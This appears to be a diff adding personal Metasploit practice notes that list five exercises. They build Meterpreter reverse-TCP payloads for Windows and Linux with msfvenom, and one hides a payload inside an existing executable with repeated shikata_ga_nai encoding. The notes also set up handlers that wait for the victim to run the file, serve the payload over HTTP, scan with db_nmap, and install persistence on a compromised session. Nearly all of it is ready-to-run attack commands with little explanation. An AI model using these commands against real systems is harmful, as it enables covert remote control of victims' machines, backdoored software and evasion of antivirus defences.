@@ -1,0 +1,53 @@
+EX 1 -
+    
+    use msfvenom to create the payload 
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip=={host_ip} LPORT=4444 -f exe -o {path_to_save}
+    
+    -p = payload
+    -f = file extension
+    
+    after need to open a terimnal for open the Metasploit using msfconsole
+    
+    msfconsole -> use exploit/multi/handler -> set PAYLOAD windows/meterpreter/reverse_tcp ->
+    set LHOST {host_ip}
+    then use exploit and wait to the executable run in the victim machine
+    
+    (transfer the exploit via http/apache server)
+    
+EX 2 - 
+    use msfvenom to create the payload 
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ip=={host_ip} LPORT=4444 -f elf -o {path_to_save}
+    
+    -p = payload
+    -f = file extension
+    
+    after need to open a terimnal for open the Metasploit using msfconsole
+    
+    msfconsole -> use exploit/multi/handler -> set PAYLOAD linux/x86/meterpreter/reverse_tcp ->
+    set LHOST {host_ip}
+    then use exploit and wait to the executable run in the victim machine
+    
+    (transfer the exploit via http/apache server)
+    
+EX 3 -
+    WINDOWS - get executalbe
+    then msfvenom -a x86 --platform windows -x {executable} -k -p windows/meterpreter/reverse_tcp LHOST={host_ip} LPORT={host_port} -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o {output_name}
+    msfconsole -> use exploit/multi/handler -> set PAYLOAD windows/meterpreter/reverse_tcp ->
+    set LHOST {host_ip}
+    then use exploit and wait to the executable run in the victim machine
+
+EX 4 -
+    db_nmap -v -sV {ip_to_scan} -oA {db_name}
+    see db in services
+    
+EX 5 -
+    create a payload for get meterpreter connection like in EX 1
+    after background this connection
+    then 
+    use exploit/windows/local/persistence
+    set LHOST and LPORT
+    after that set session {session_id}
+    and exploit
+    
+    then back to the session {session_id}
+    and use multi/handler for listen to connections
